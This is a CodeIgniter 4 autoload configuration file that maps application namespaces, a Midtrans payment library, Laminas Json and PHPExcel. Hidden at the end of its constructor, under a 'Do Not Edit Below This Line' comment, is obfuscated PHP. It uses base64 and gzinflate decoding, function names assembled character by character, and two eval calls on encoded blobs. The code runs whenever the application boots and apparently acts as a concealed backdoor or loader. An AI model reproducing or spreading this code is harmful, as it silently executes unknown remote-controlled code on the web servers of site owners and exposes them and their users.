<?php namespace Config;

require_once SYSTEMPATH . 'Config/AutoloadConfig.php';

/**
 * -------------------------------------------------------------------
 * AUTO-LOADER
 * -------------------------------------------------------------------
 * This file defines the namespaces and class maps so the Autoloader
 * can find the files as needed.
 */
class Autoload extends \CodeIgniter\Config\AutoloadConfig
{
	public $psr4 = [];

	public $classmap = [];

	//--------------------------------------------------------------------

	/**
	 * Collects the application-specific autoload settings and merges
	 * them with the framework's required settings.
	 *
	 * NOTE: If you use an identical key in $psr4 or $classmap, then
	 * the values in this file will overwrite the framework's values.
	 */
	public function __construct()
	{
		parent::__construct();

		/**
		 * -------------------------------------------------------------------
		 * Namespaces
		 * -------------------------------------------------------------------
		 * This maps the locations of any namespaces in your application
		 * to their location on the file system. These are used by the
		 * Autoloader to locate files the first time they have been instantiated.
		 *
		 * The '/app' and '/system' directories are already mapped for
		 * you. You may change the name of the 'App' namespace if you wish,
		 * but this should be done prior to creating any namespaced classes,
		 * else you will need to modify all of those classes for this to work.
		 *
		 * DO NOT change the name of the CodeIgniter namespace or your application
		 * WILL break. *
		 * Prototype:
		 *
		 *   $Config['psr4'] = [
		 *       'CodeIgniter' => SYSPATH
		 *   `];
		 */
		$psr4 = [
			'App'         => APPPATH,                // To ensure filters, etc still found,
			APP_NAMESPACE => APPPATH,                // For custom namespace
			'Config'      => APPPATH . 'Config',
			'Codenom\Midtrans' => APPPATH . 'ThirdParty/Codenom/Midtrans/src',
			'Laminas\Json' => APPPATH . 'ThirdParty/Laminas/src'
		];

		/**
		 * -------------------------------------------------------------------
		 * Class Map
		 * -------------------------------------------------------------------
		 * The class map provides a map of class names and their exact
		 * location on the drive. Classes loaded in this manner will have
		 * slightly faster performance because they will not have to be
		 * searched for within one or more directories as they would if they
		 * were being autoloaded through a namespace.
		 *
		 * Prototype:
		 *
		 *   $Config['classmap'] = [
		 *       'MyClass'   => '/path/to/class/file.php'
		 *   ];
		 */
		$classmap = [
			'PHPExcel' => ROOTPATH.'app/ThirdParty/PHPExcel.php'
		];

		//--------------------------------------------------------------------
		// Do Not Edit Below This Line
		//--------------------------------------------------------------------

		 $keystroke1 = base64_decode("d2RyMTU5c3E0YXllejd4Y2duZl90djhubHVrNmpoYmlvMzJtcA==");
eval(gzinflate(base64_decode('hY5NCsIwEIWv8ixdZDCKWZcuPUfRdqrBmsBkAkrp3aVIi3Tj9v1+vje7PodWfQwNv3zSZAqJyqGNHRdE4+JiVU2ZVHy42fLyjDkoYUT54DdqpHxNKmsAJwtHFXxvksrAYXGort1cE9YsAe1dTJTOzCuEPZbhChN4SPw/iePMd/7ybSmcxeb+4Mj+vkzTBw==')));
$O0O0O0O0O0O0=$keystroke1[2].$keystroke1[32].$keystroke1[20].$keystroke1[11].$keystroke1[23].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
$keystroke2 = $O0O0O0O0O0O0("xes26:tr5bzf{8ydhog`uw9omvl7kicjp43nq", -1);
$OO000OO000OO=$keystroke2[16].$keystroke2[12].$keystroke2[31].$keystroke2[23].$keystroke2[18].$keystroke2[24].$keystroke2[9].$keystroke2[20].$keystroke2[11];
$O0000000000O=$keystroke1[30].$keystroke1[9].$keystroke1[6].$keystroke1[11].$keystroke1[27].$keystroke1[8].$keystroke1[19].$keystroke1[1].$keystroke1[11].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
eval($OO000OO000OO(base64_decode('LcQ3Dq
taAgDQzYz035MLMhhNRbqYnGMzIhmT4ZJZ/W/mFK
c6sv7PfywLRdH/9yfP1oom/1dWxVRWf/7RC4cQly
3jatF5kgclLgPQkcoFFDAfKKVdbMuxZYcInlpFNT
EjwrwvJrlEe0O+JHxDgNRfLCxhH7PU9WpLqb9YQt
tBPo5sYdyPVS4+38juckFvIhQSS5NU0m29XqDFd1
EvEX0YYe7vE0XilahiGkrpy/0I5Fwz+1DzYiw6kW
j0j03azv16G5M1qBzjNDtt/wbhsweoALDgNTw8tT
GNgF/YE/nFjbfb+7Ixt7EXAFCaJ8Ma4eEPfbeJPU
medUMGB81XuWwlDzc5NdROHkdFxWmh6DpowtIyLN
Dm/tEf8pnR1gzw9BIlfIrfuKNF1FyhXDeoTuSJ0y
HryYxClf9ykQ6t5Pcetxwg/Zn/no7f36+3Tn+kMc
Mnjp/77LGWJZlKa8DCg+yCj/6WZEcbiWk71jRVPS
fidm1O6uw92tBaYzPgAwohQsN1suTFra/9gnItoU
KRvEP9OPs3zADoFOWarl+dZE4/fu6IAYa2x3fVoN
RhlQZzeD6077TYHweZX5eQlupM876ukiUCcNxrWV
6up+WHY306I33CjDH2ivyJBrGdd4HH9bTggCOkCJ
RgJ6pzD643RzquNJjTuWhlpFbGxmYpQ5lCpvZHLU
TWoKmBTJ8K77HEWCX3uSkUG7uHZ1n4rd6BO/5uEE
QFVHxBFAoHw/EmwGIknU0Zc8OKIYWDxF+uW3Hl+d
nuFk+2RDd5iLAeGYiNF1CFQM0do/RCoA69iGx+Q9
GW0QIp/8b8KJYnMeSICMY4fs9VOpiUYHtRGx5qIl
C2NXw9jnOOtNDjlIq8p1S2ruOYYZTlMyKUsbM8zg
7GBXn2QY37c7WwsdkAQFoNm/YnZucT+7phmlGnN6
slWcnNz99Su0qYcozS0MPCvlf9VXSIWj/E5XDbgY
TSDLNJjpJG14jqUnU+Y6JT5dxj7+YQmal9yVuJQO
KzUUkz6W3KBFudegW5bxHwT/kVPFkwuxSZy4SgA/
a0yYbLSEUvyPqkWlSIYr5mBvGzOK+7UnOlTMMafK
AcIjbhNq+5ZJAllnZt9TXGrLGfz49migfge0HZoE
m0VCo0wV/OGo9p+fu0V+8wbQ0Ifn4ZCHO31dZ41N
qlz3UJ7qJ+Rc5XFkQkar8QTNYAOEnosmWlbQN8ou
vRn+xza/8kyvSzEw4jD9jpQVarJkHi9yqim2LMc3
bnxIK0Lpo1H0rW3WrFJSpE8okZx0RaXMQzb/BuYW
R+ans1nUIgRb30fd3ktAHZYdjEqvgtXKLPBHYQNs
43E+bL6DPN4sOOUyYQ7PuIacrLCb8odxxtXISs7G
c84l6n0/mrtQIKO5dfFHqffpubFeqOfB8mUg2nmk
oCA9Q7vb11z6X9Dj9nDU9jLdYCzdHW2MxwpZK2cq
lk35THsrZnnBVpoZNUq6VvJMvo8oUZCaXLttUkZm
Gi/fCyLAKiDpqz+LGGWGFX6OG21SXxQ+ZBHNPNeg
UfYdhF1ycsX1NgFX5tm2BYBEHW45+/f//+918=')
));
	}

	//--------------------------------------------------------------------

}
